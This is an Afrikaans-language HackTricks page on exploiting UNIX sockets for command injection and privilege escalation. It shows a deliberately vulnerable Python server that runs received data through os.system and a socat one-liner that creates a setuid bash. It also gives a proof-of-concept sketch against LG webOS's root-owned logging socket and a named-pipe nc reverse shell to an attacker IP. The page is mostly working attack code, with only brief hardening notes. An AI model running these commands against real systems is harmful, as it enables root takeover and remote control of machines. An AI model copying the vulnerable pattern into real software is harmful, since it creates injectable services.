# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket-bindingvoorbeeld met Python

In die volgende voorbeeld word ’n **unix socket geskep** (`/tmp/socket_test.s`) en alles wat **ontvang** word, gaan deur `os.system` **uitgevoer** word. Ek weet dat jy dit nie in die wild gaan vind nie, maar die doel van hierdie voorbeeld is om te sien hoe kode wat unix sockets gebruik daar uitsien, en hoe om die invoer in die slegste moontlike geval te hanteer.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Voer** die kode uit met Python: `python s.py` en **kontroleer hoe die socket luister**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Gevallestudie: Root-owned UNIX socket signal-gedrewe eskalering (LG webOS)

Sommige bevoorregte daemons stel 'n root-owned UNIX socket bloot wat onvertroude invoer aanvaar en bevoorregte aksies aan thread-ID's en signals koppel. As die protokol 'n unprivileged client toelaat om te beïnvloed watter native thread geteiken word, kan jy moontlik 'n bevoorregte kodepad aktiveer en eskaleer.<sup>[[1]](#references)</sup>

Waargenome patroon:
- Koppel aan 'n root-owned socket (byvoorbeeld /tmp/remotelogger).
- Skep 'n thread en kry sy native thread ID (TID).
- Stuur die TID (packed) plus padding as 'n versoek; ontvang 'n acknowledgement.
- Stuur 'n spesifieke signal na daardie TID om die bevoorregte gedrag te aktiveer.

Minimale PoC-skets:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Om dit in ’n root shell te omskep, kan ’n eenvoudige named-pipe + nc-patroon gebruik word:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Aantekeninge:
- Hierdie klas foute ontstaan wanneer waardes wat van onbevoorregte kliënttoestand (TIDs) afgelei is, vertrou word en aan bevoorregte signal handlers of logika gekoppel word.
- Versterk sekuriteit deur credentials op die socket af te dwing, boodskapformate te valideer en bevoorregte bewerkings van ekstern verskafde thread-identifiseerders los te koppel.

## Verwysings

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
